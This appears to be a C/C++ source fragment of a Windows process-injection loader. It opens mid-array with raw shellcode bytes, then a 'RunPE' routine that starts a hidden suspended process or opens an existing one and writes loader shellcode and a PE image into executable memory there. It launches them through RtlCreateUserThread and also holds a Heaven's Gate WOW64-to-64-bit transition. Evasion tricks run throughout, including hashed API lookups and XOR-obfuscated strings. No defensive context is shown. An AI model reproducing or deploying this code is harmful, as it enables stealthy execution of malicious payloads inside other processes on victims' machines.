	0x8b, 0x5f, 0x28, 0x33, 0xd2, 0x45, 0x33, 0xc0, 0x49, 0x03, 0xde, 0x48, 0x8d, 0x4a, 0xff, 0xff,
	0x54, 0x24, 0x60, 0x45, 0x33, 0xc0, 0x49, 0x8b, 0xce, 0x41, 0x8d, 0x50, 0x01, 0xff, 0xd3, 0x4c,
	0x8b, 0x7c, 0x24, 0x20, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x78, 0x48, 0x8b, 0x7c, 0x24,
	0x28, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc,
	0xc1, 0xc9, 0x0d, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x0f, 0xb6, 0x11, 0x33, 0xc0, 0x66, 0x66, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xc1, 0xc8, 0x0d, 0x48, 0x8d, 0x49, 0x01, 0x0f, 0xbe, 0xd2, 0x03, 0xc2, 0x0f, 0xb6, 0x11, 0x84,
	0xd2, 0x75, 0xed, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0x48, 0x8b, 0x04, 0x24, 0xc3
};

typedef BOOL(WINAPI* FP_IsWow64Process)(HANDLE, BOOL*);

int GetProcessBits(HANDLE hProc)
/* hProc must be opened with PROCESS_QUERY_LIMITED_INFORMATION */
{
	BOOL iswow64 = FALSE;
	FP_IsWow64Process fpIsWow64Process = (FP_IsWow64Process)IsWow64Process; //(FP_IsWow64Process)(get_proc_address(hKernel32, 0xa50dc580)); 

	if (fpIsWow64Process == NULL)
		return 32;
	if (fpIsWow64Process(hProc, &iswow64)) {
		return iswow64 ? 32 : 64;
	}
	return 0;
}

int GetCurrentProcessBits()
{
	SYSTEM_INFO si = { 0 };
	GetSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		return 64;
	else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		return 32;
	return 0;
}


const IMAGE_NT_HEADERS* GetNtHeader(const BYTE* image, const DWORD imageSize)
{
	const IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)image;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((ULONG_PTR)image + dosHeader->e_lfanew);
	if ((BYTE*)ntHeader < image) {
		return NULL;
	}
	if ((BYTE*)ntHeader > (image + imageSize - sizeof(IMAGE_NT_HEADERS))) {
		return NULL;
	}
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}
	return ntHeader;
}


#if defined(_M_IX86)

void ExecuteNative64(void* shellcode, void* arg)
{
	unsigned long saved_esp = 0;
	__asm {
		mov saved_esp, esp
		and esp, 0xfffffff0

		push 033h; CS reg value for 64 bit
		call push_eip
		push_eip :
		add[esp], 5; 5 is size of add / retf
			retf

			; this executes in 64 bit mode
			sub esp, 020h; give shellcode some room to play
			mov eax, shellcode
			mov ecx, arg
			call eax
			add esp, 020h

			mov ecx, 02bh
			mov ss, cx; Windows does this but seems to be a nop ?

			call push_rip; call pushes a 64 bit address here
			push_rip :
		mov dword ptr[esp + 4], 023h; CS reg for 32 bit
			add dword ptr[esp], 0dh; 0xd is size of mov / add / retf
			retf

			; back to wow64
			mov esp, saved_esp
	}
}
#endif

typedef LONG(NTAPI* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, LPVOID);
typedef DWORD(WINAPI* GETTHREADID)(HANDLE);

int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*)L"")
{
	hKernel32 = get_kernel32base();
	hNtdll = get_ntdllbase();

	LPVOID(WINAPI * pVirtualAllocEx)(__in     HANDLE hProcess, __in_opt LPVOID lpAddress, __in     SIZE_T dwSize, __in     DWORD flAllocationType, __in     DWORD flProtect);
	BOOL(WINAPI * pWriteProcessMemory)(__in      HANDLE hProcess, __in      LPVOID lpBaseAddress, __in_bcount(nSize) LPCVOID lpBuffer, __in      SIZE_T nSize, __out_opt SIZE_T * lpNumberOfBytesWritten);
	BOOL(WINAPI * pCreateProcessW) (__in_opt    LPCWSTR lpApplicationName, __inout_opt LPWSTR lpCommandLine, __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes, __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes, __in        BOOL bInheritHandles, __in        DWORD dwCreationFlags, __in_opt    LPVOID lpEnvironment, __in_opt    LPCWSTR lpCurrentDirectory, __in        LPSTARTUPINFOW lpStartupInfo, __out       LPPROCESS_INFORMATION lpProcessInformation);
	*(DWORD_PTR*)&pCreateProcessW = (DWORD_PTR)CreateProcessW;//get_proc_address(hKernel32, 0xb4f0f46f);
	*(DWORD_PTR*)&pVirtualAllocEx = (DWORD_PTR)VirtualAllocEx;//get_proc_address(hKernel32, 0x0dd78764);
	*(DWORD_PTR*)&pWriteProcessMemory = (DWORD_PTR)WriteProcessMemory;//get_proc_address(hKernel32, 0x6659de75);

#ifdef INJECT_TO_EXISTING_PROCESS 
	DWORD pid = FindProcByName(procname);
	printfdbg(XorStr("Pid %x (%s)\n"), pid, procname);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
#else
	PROCESS_INFORMATION PI;
	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
	STARTUPINFOW SI;
	memset(&SI, 0, sizeof(STARTUPINFO));
	pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL, NULL, &SI, &PI);
	HANDLE hProc = PI.hProcess;
#endif
	
	if (hProc) 
	{
		printfdbg(XorStr("Handle opened %x\n"), (DWORD)hProc);
	}
	else
	{
		printfdbg(XorStr("Cannot open handle %x\n"), GetLastError());
		return 1;
	}

	// get remote process arch
	const int bits = GetProcessBits(hProc);
	if (bits == 0) {
		printfdbg(XorStr("GetProcessBits error %x\n"), GetLastError());
		return 1;
	}

	// ensure inject process is same arch as dll 
	const IMAGE_NT_HEADERS* ntHeader = GetNtHeader(image, imageSize);
	if (ntHeader == NULL) {
		printfdbg(XorStr("GetNtHeader error %x\n"), GetLastError());
		return 1;
	}
  
	if ((ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 && bits != 32) ||
		(ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && bits != 64)) {
		printfdbg(XorStr("Inject process arch does not match DLL (source %d, target %d)\n"),ntHeader->FileHeader.Machine, bits);
		return 1;
	}

	// choose correct loader arch for remote process
	BYTE* loader = NULL;
	size_t loaderSize = 0;
	if (bits == 32) {
		loaderSize = sizeof(loader_x86);
		loader = (BYTE*)loader_x86;
	}
	else {
		loaderSize = sizeof(loader_x64);
		loader = (BYTE*)loader_x64;
	}

	printfdbg("Loader %x size %x\n",(DWORD)loader,loaderSize);

	// allocate remote memory for loader shellcode + dll
	const size_t remoteShellcodeSize = loaderSize + imageSize;
	void* remoteShellcode = pVirtualAllocEx(hProc, 0, remoteShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteShellcode == NULL) {
		printfdbg(XorStr("pVirtualAllocEx error %x\n"), GetLastError());	
		return 1;
	} 

	// write shellcode to remote process
	SIZE_T numWritten = 0;
	if (!pWriteProcessMemory(hProc, remoteShellcode, loader, loaderSize, &numWritten) ||
		!pWriteProcessMemory(hProc, (BYTE*)remoteShellcode + loaderSize, image, imageSize, &numWritten)) {
		printfdbg(XorStr("pWriteProcessMemory error %x\n"), GetLastError());
		return 1;
	}
 
	HANDLE hThread = NULL;
	if ((GetCurrentProcessBits() == 64) || (GetCurrentProcessBits() == bits)) {
		RTLCREATEUSERTHREAD fpRtlCreateUserThread = (RTLCREATEUSERTHREAD)get_proc_address(hNtdll, 0xd24c9118);
		if (fpRtlCreateUserThread == NULL) {
			printfdbg(XorStr("fpRtlCreateUserThread error %x\n"), GetLastError());
			return 1;
		}
		fpRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, &hThread, NULL);
	}
	
#if defined(_M_IX86)
	else {
		// wow64 -> native 64
		InjectArgs args = { 0 };
		args.start = (UINT64)remoteShellcode;
		args.hProcess = (UINT64)hProc;
		void* rwx = VirtualAlloc(0, sizeof(injectWow64toNative64), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		CopyMemory(rwx, injectWow64toNative64, sizeof(injectWow64toNative64));
		ExecuteNative64(rwx, &args);

	}
#endif
	if (hThread != NULL) 
		return 0;
	

	return 1;
}
